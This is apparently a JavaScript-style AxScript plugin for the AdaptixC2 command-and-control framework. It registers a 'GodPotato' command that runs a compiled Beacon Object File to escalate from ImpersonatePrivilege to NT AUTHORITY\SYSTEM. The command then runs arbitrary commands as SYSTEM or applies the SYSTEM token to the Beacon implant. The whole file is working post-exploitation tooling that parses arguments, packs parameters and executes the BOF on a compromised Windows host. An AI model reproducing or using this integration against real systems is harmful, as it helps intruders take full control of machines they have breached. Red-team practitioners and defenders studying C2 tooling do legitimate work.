//
// GodPotato BOF — AdaptixC2 AxScript
// Potato privilege escalation (BeichenDream/GodPotato)
// Requires ImpersonatePrivilege. Elevates to NT AUTHORITY\SYSTEM and runs a command.
//

var metadata = {
    name: "GodPotato",
    description: "GodPotato BOF — elevate to SYSTEM and run a command or impersonate Beacon",
    store: true
};

var cmd_godpotato = ax.create_command(
    "GodPotato",
    "GodPotato BOF — elevate to SYSTEM and run a command or impersonate Beacon",
    `GodPotato [token] [-cmd <command>] [-pipe <name>]

  Argument       Description
  (none)         Run "cmd /c whoami" as SYSTEM.
  token          Apply a SYSTEM token to the current Beacon with BeaconUseToken().
  -cmd <cmd>     Run a command as SYSTEM in a spawned process.
  -pipe <name>   Use a custom named pipe. Default is a random pipe name.

Examples:
  GodPotato
  GodPotato token
  GodPotato -cmd "cmd /c whoami /priv"
  GodPotato -cmd "cmd /c dir"
  GodPotato -cmd "cmd /c whoami" -pipe "mycustompipe"`
);

// Optional: "token" positional — apply SYSTEM token to Beacon instead of running a command
cmd_godpotato.addArgString("mode", 'Optional mode: pass "token" to apply a SYSTEM token to the Beacon', "");

// Optional: command to run as SYSTEM (mutually exclusive with token mode)
cmd_godpotato.addArgString("cmd", 'Command to run as SYSTEM (e.g. "cmd /c whoami /priv"). Omit to run default "cmd /c whoami"', "");

// Optional: named pipe override
cmd_godpotato.addArgString("pipe", "Custom named pipe name (default: random)", "");

cmd_godpotato.setPreHook(function (id, cmdline, parsed_json) {
    let mode = (parsed_json["mode"] || "").trim();
    let cmd  = (parsed_json["cmd"]  || "").trim();
    let pipe = (parsed_json["pipe"] || "").trim();

    // Validate: token and -cmd are mutually exclusive
    if (mode === "token" && cmd !== "") {
        ax.log_error('GodPotato error: "token" and "-cmd" are mutually exclusive. Use one or the other.');
        return;
    }

    // Determine effective command string passed to the BOF
    let bof_cmd;
    if (mode === "token") {
        bof_cmd = "token";
    } else if (cmd !== "") {
        bof_cmd = cmd;
    } else {
        bof_cmd = "cmd /c whoami";
    }

    let arch     = ax.arch(id); // "x64" or "x86"
    let bof_path = ax.script_dir() + "dist/BOF." + arch + ".o";

    // bof_pack types: "cstr" = zero-terminated+encoded string (maps to CNA's "z")
    // Format is comma-separated; array length must match type count exactly.
    let bof_params = ax.bof_pack("cstr,cstr", [bof_cmd, pipe]);

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: GodPotato — running as SYSTEM");
});

var godpotato_group = ax.create_commands_group("GodPotato", [cmd_godpotato]);
ax.register_commands_group(godpotato_group, ["beacon"], ["windows"], []);
